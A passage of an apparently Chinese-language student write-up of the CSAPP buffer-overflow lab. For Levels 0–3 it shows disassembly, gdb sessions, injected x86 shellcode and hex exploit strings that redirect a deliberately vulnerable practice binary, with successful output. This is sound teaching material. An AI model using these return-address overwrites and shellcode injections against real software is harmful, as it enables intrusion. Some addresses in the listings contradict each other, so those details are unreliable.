class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">./0.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">0b 8e 04 08</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 0.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-Level1-Sparkler-10-pts"><a href="#2-Level1-Sparkler-10-pts" class="headerlink" title="2.Level1: Sparkler (10 pts)"></a>2.Level1: Sparkler (10 pts)</h1><p>Similar to Level 0, your task isto get BUFBOMB to execute the code for fizz rather than returningto test. In this case, however, you must make it appear to fizz as if you havepassed your cookie as its argument. How can you do this?</p><p>题意解析：</p><p>在level 0的基础上，使getbuf函数的返回指向fizz函数，同时将fizz函数的参数置为userid对应的cookie值。</p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>fizz()函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fizz</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line"> <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fizz!: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line">    validate(<span class="number">1</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You calledfizz(0x%x)\n&quot;</span>, val);</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>查看fizz()函数的汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble fizz </span><br><span class="line">Dump of assembler code for function fizz:</span><br><span class="line">   0x08048daf &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048db0 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048db2 &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048db5 &lt;+6&gt;:mov    0x8(%ebp),%eax</span><br><span class="line">   0x08048db8 &lt;+9&gt;:cmp    0x804d104,%eax</span><br><span class="line">   0x08048dbe &lt;+15&gt;:jne    0x8048de6 &lt;fizz+55&gt;</span><br><span class="line">   0x08048dc0 &lt;+17&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dc4 &lt;+21&gt;:movl   $0x804a2e0,0x4(%esp)</span><br><span class="line">   0x08048dcc &lt;+29&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048dd3 &lt;+36&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dd8 &lt;+41&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048ddf &lt;+48&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048de4 &lt;+53&gt;:jmp    0x8048dfe &lt;fizz+79&gt;</span><br><span class="line">   0x08048de6 &lt;+55&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048dea &lt;+59&gt;:movl   $0x804a4d4,0x4(%esp)</span><br><span class="line">   0x08048df2 &lt;+67&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048df9 &lt;+74&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048dfe &lt;+79&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048e05 &lt;+86&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x08048dc0 &lt;+17&gt;:mov    %eax,0x8(%esp)</span><br></pre></td></tr></table></figure><p>这一步就是在取参数，正好取的就是第二个参数区的位置</p><p>在getbuf()的返回地址中存入fizz()函数的地址,返回地址上面的那个函数参数区存fizz()函数的返回地址，但由于fizz()函数根本不会返回，所以可以随意存，最上面的函数参数区存要传入的cookie参数</p><p>答案及结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./1.txt</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13</span><br><span class="line">af 8d 04 08 //fizz()函数的地址</span><br><span class="line">11 11 11 11//fizz()函数的返回地址</span><br><span class="line">96 1d 5c 68 //cookie参数</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 1.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Fizz!: You called fizz(0x685c1d96)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="3-Level2-Firecracker-15-pts"><a href="#3-Level2-Firecracker-15-pts" class="headerlink" title="3.Level2: Firecracker (15 pts)"></a>3.Level2: Firecracker (15 pts)</h1><p>Similar to Levels0 and 1, your task is to get BUFBOMB to execute the code for bang rather than returningto test. Before this, however, you must set global variable global_value toyour userid’s cookie. Your exploit code should set global_value, push theaddress of bang on the stack, and then execute a ret instruction to cause ajump to the code for bang.</p><p>题意解析：</p><p>令getbuf调用后不执行test函数，而是执行bang函数（默认会执行test函数），但是同时我们要修改global_value的值为cookie值。然而，global_value是一个全局变量，它没有储存再栈里面。所以在程序执行过程中，只能通过赋值语句来改变global_value的值。即这次我们不仅要让函数跳到bang中，而且要模拟一个函数调用来进行赋值。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>bang()函数源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> global_value =<span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">bang</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (global_value ==cookie) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Bang!:You set global_value to 0x%x\n&quot;</span>, global_value);</span><br><span class="line">validate(<span class="number">2</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Misfire:global_value = 0x%x\n&quot;</span>, global_value);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/31da264d8cc84f249b4ac64a317d7aa5.png#pic_center" alt="在这里插入图片描述"></p><p>先假设我们已经有段攻击代码可以更改global_value的值，我们应该把这段攻击代码放在哪里？</p><p>答案是buf缓冲区，这里有很大一部分空间可以用来存放我们的攻击代码，返回地址存buf缓冲区的首地址，这样getbuf() return的时候会跑到buf缓冲区里面去，我们只需要将攻击代码加上一个返回指令，让代码执行结束后返回到bang()函数的位置，让程序继续运行bang()函数就ok</p><p>攻击代码需要实现的功能：</p><h5 id="1-更改global-val的值为cookie"><a href="#1-更改global-val的值为cookie" class="headerlink" title="1.更改global_val的值为cookie"></a>1.更改global_val的值为cookie</h5><h5 id="2-将bang-函数的地址作为返回地址压栈"><a href="#2-将bang-函数的地址作为返回地址压栈" class="headerlink" title="2.将bang()函数的地址作为返回地址压栈"></a>2.将bang()函数的地址作为返回地址压栈</h5><p>查看bang()函数的汇编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble bang </span><br><span class="line">Dump of assembler code for function bang:</span><br><span class="line">   0x08048d52 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048d53 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048d55 &lt;+3&gt;:sub    $0x18,%esp</span><br><span class="line">   0x08048d58 &lt;+6&gt;:mov    0x804d10c,%eax</span><br><span class="line">   0x08048d5d &lt;+11&gt;:cmp    0x804d104,%eax</span><br><span class="line">   0x08048d63 &lt;+17&gt;:jne    0x8048d8b &lt;bang+57&gt;</span><br><span class="line">   0x08048d65 &lt;+19&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d69 &lt;+23&gt;:movl   $0x804a4ac,0x4(%esp)</span><br><span class="line">   0x08048d71 &lt;+31&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d78 &lt;+38&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048d7d &lt;+43&gt;:movl   $0x2,(%esp)</span><br><span class="line">   0x08048d84 &lt;+50&gt;:call   0x8049280 &lt;validate&gt;</span><br><span class="line">   0x08048d89 &lt;+55&gt;:jmp    0x8048da3 &lt;bang+81&gt;</span><br><span class="line">   0x08048d8b &lt;+57&gt;:mov    %eax,0x8(%esp)</span><br><span class="line">   0x08048d8f &lt;+61&gt;:movl   $0x804a2c2,0x4(%esp)</span><br><span class="line">   0x08048d97 &lt;+69&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048d9e &lt;+76&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048da3 &lt;+81&gt;:movl   $0x0,(%esp)</span><br><span class="line">   0x08048daa &lt;+88&gt;:call   0x80488d0 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到bang()函数的首地址为0x08048d52</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048d58 &lt;+6&gt;:mov    0x804d10c,%eax</span><br><span class="line">0x08048d5d &lt;+11&gt;:cmp    0x804d104,%eax</span><br></pre></td></tr></table></figure><p>这两段代码可以看出global_val的地址为0x804d10c,0x804d104存放的是cookie的值</p><p>故攻击代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  //将cookie值存入eax寄存器</span><br><span class="line">movl %eax,0x804d104 //将eax中的（cookie）值存入global_value的地址</span><br><span class="line">pushl $0x08048d52  //将bang作为返回地址压栈 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>将其保存为2.s文件</p><p>接下来将汇编代码(2.s)转化成二进制文件(2.o)，并用objdump -d 命令查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ as 2.s -o 2.o</span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ objdump -d 2.o</span><br><span class="line"></span><br><span class="line">2.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:b8 96 1d 5c 68       mov    $0x685c1d96,%eax</span><br><span class="line">   5:a3 0c d1 04 08       mov    %eax,0x804d10c</span><br><span class="line">   a:68 52 8d 04 08       push   $0x8048d52</span><br><span class="line">   f:c3                   ret    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 </span><br></pre></td></tr></table></figure><p>最后，查看buf缓冲区的首地址</p><p>查看getbuf()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br></pre></td></tr></table></figure><p>gdb调试，设置断点在0x0804926b，并查看寄存器eax即可得知buf首地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x0804926b</span><br><span class="line">Breakpoint 1 at 0x804926b</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x0804926b in getbuf ()</span><br><span class="line">(gdb) p/x $eax</span><br><span class="line"><span class="meta">$</span><span class="language-bash">1 = 0x55683848</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>buf首地址为0x55683848</p><h5 id="答案及结果-1"><a href="#答案及结果-1" class="headerlink" title="答案及结果"></a>答案及结果</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">./2.txt</span><br><span class="line">b8 96 1d 5c 68</span><br><span class="line">a3 0c d1 04 08</span><br><span class="line">68 52 8d 04 08</span><br><span class="line">c3 //攻击代码</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 18 19</span><br><span class="line">10 11 12 13 14 15 16 17 //填充代码</span><br><span class="line">48 38 68 55 //buff首地址</span><br><span class="line"></span><br><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ ./hex2raw &lt; 2.txt | ./bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line">Type string:Bang!: You set global_value to 0x685c1d96</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="4-Level-3-Dynamite-20-pts"><a href="#4-Level-3-Dynamite-20-pts" class="headerlink" title="4.Level 3: Dynamite (20 pts)"></a>4.Level 3: Dynamite (20 pts)</h1><p>Your job for thislevel is to supply an exploit string that will cause getbuf to return yourcookie back to test, rather than the value 1. You can see in the code for testthat this will cause the program to go“Boom!.” Your exploit code should set your cookie asthe return value, restore any corrupted state, push the correct return locationon the stack, and execute a ret instruction to really return to test.</p><p>题意解析：</p><p>这次要求getbuf调用后，返回到test当中，但是不能破坏为test函数维护的堆栈状态（test函数加了堆栈状态检测），同时要让test函数调用getbuf后的返回值（val）为自己的cookie。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>test，getbuf源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NORMAL_BUFFER_SIZE 32</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="comment">/* Put canary on stack to detect possiblecorruption */</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> local = uniqueval();</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="comment">/* Check for corruption stack */</span></span><br><span class="line">    <span class="keyword">if</span> (local != uniqueval())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Sabotaged!: the stack has beencorrupted\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (val == cookie)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Boom!: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Dud: getbuf returned0x%x\n&quot;</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[NORMAL_BUFFER_SIZE];</span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看getbuf(),test()汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">lkl@lkl-virtual-machine:~/桌面/计算机系统/buflab-handout$ gdb -q bufbomb</span><br><span class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x08049262 &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08049263 &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08049265 &lt;+3&gt;:sub    $0x38,%esp</span><br><span class="line">   0x08049268 &lt;+6&gt;:lea    -0x28(%ebp),%eax</span><br><span class="line">   0x0804926b &lt;+9&gt;:mov    %eax,(%esp)</span><br><span class="line">   0x0804926e &lt;+12&gt;:call   0x8048c32 &lt;Gets&gt;</span><br><span class="line">   0x08049273 &lt;+17&gt;:mov    $0x1,%eax</span><br><span class="line">   0x08049278 &lt;+22&gt;:leave  </span><br><span class="line">   0x08049279 &lt;+23&gt;:ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x08048e3c &lt;+0&gt;:push   %ebp</span><br><span class="line">   0x08048e3d &lt;+1&gt;:mov    %esp,%ebp</span><br><span class="line">   0x08048e3f &lt;+3&gt;:push   %ebx</span><br><span class="line">   0x08048e40 &lt;+4&gt;:sub    $0x24,%esp</span><br><span class="line">   0x08048e43 &lt;+7&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e48 &lt;+12&gt;:mov    %eax,-0xc(%ebp)</span><br><span class="line">   0x08048e4b &lt;+15&gt;:call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">   0x08048e50 &lt;+20&gt;:mov    %eax,%ebx</span><br><span class="line">   0x08048e52 &lt;+22&gt;:call   0x8048c18 &lt;uniqueval&gt;</span><br><span class="line">   0x08048e57 &lt;+27&gt;:mov    -0xc(%ebp),%edx</span><br><span class="line">   0x08048e5a &lt;+30&gt;:cmp    %edx,%eax</span><br><span class="line">   0x08048e5c &lt;+32&gt;:je     0x8048e74 &lt;test+56&gt;</span><br><span class="line">   0x08048e5e &lt;+34&gt;:movl   $0x804a460,0x4(%esp)</span><br><span class="line">   0x08048e66 &lt;+42&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e6d &lt;+49&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line">   0x08048e72 &lt;+54&gt;:jmp    0x8048eba &lt;test+126&gt;</span><br><span class="line">   0x08048e74 &lt;+56&gt;:cmp    0x804d104,%ebx</span><br><span class="line">   0x08048e7a &lt;+62&gt;:jne    0x8048ea2 &lt;test+102&gt;</span><br><span class="line">   0x08048e7c &lt;+64&gt;:mov    %ebx,0x8(%esp)</span><br><span class="line">   0x08048e80 &lt;+68&gt;:movl   $0x804a31a,0x4(%esp)</span><br><span class="line">   0x08048e88 &lt;+76&gt;:movl   $0x1,(%esp)</span><br><span class="line">   0x08048e8f &lt;+83&gt;:call   0x8048990 &lt;__printf_chk@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="https://img-blog.csdnimg.cn/0d0b08a02aa946e6a2fde0f847c1846d.png#pic_center" alt="在这里插入图片描述"></p><p>由于此题开始要求回到test()函数，并且函数的栈空间不能被破坏，也就是test() 的ebp地址被冲掉之后还得给它存回去，那么在buf缓冲区的对应位置存回test() 的esp地址即可，返回地址依然存buf缓冲区的首地址，植入攻击代码，攻击代码的内容为：修改返回值即eax的值为cookie并重新回到test() 函数</p><p>上一题已经得知buf首地址为0x55683848，接下来要知道test() esp 的值</p><p>gdb设置断点在getbuf()函数(见上面的汇编码)中的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e3c &lt;+0&gt;:push   %ebp</span><br><span class="line">0x08048e3d &lt;+1&gt;:mov    %esp,%ebp</span><br></pre></td></tr></table></figure><p>0x08048e3d这个位置，此时test()的ebp地址已经被压入栈中，然后查看ebp所存的值</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) b *0x08049263</span><br><span class="line">Breakpoint 4 at 0x8049263</span><br><span class="line">(gdb) r -u 202026010521</span><br><span class="line">Starting program: /home/lkl/桌面/计算机系统/buflab-handout/bufbomb -u 202026010521</span><br><span class="line">Userid: 202026010521</span><br><span class="line">Cookie: 0x685c1d96</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x08049263 in getbuf ()</span><br><span class="line">(gdb) p/x $ebp</span><br><span class="line"><span class="meta">$</span><span class="language-bash">4 = 0x556838a0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到test()ebp地址的值为0x556838a0</p><p>接下来编写攻击代码，即将eax的值改为cookie，并且将程序返回到test()函数中，即test()函数调用getbuf()的下一条指令的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x08048e4b &lt;+15&gt;:call   0x8049262 &lt;getbuf&gt;</span><br><span class="line">0x08048e50 &lt;+20&gt;:mov    %eax,%ebx</span><br></pre></td></tr></table></figure><p>0x08048e50</p><p>故攻击代码编写如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $0x685c1d96,%eax  ;返回cookie值</span><br><span class="line">pushl $0x08048e50        ;返回地址指向test中的getbuf调用后一条指令</span><br><span class="line">ret                     ;返回test继续执行</span><br></pre></td></tr></table></figure><p>重复上一关的操作得到有效攻击代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b8 96 1d 5c 68</span><br><span class="line">68 50 8e 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure><p>答案及结果</p><figure class="highlight 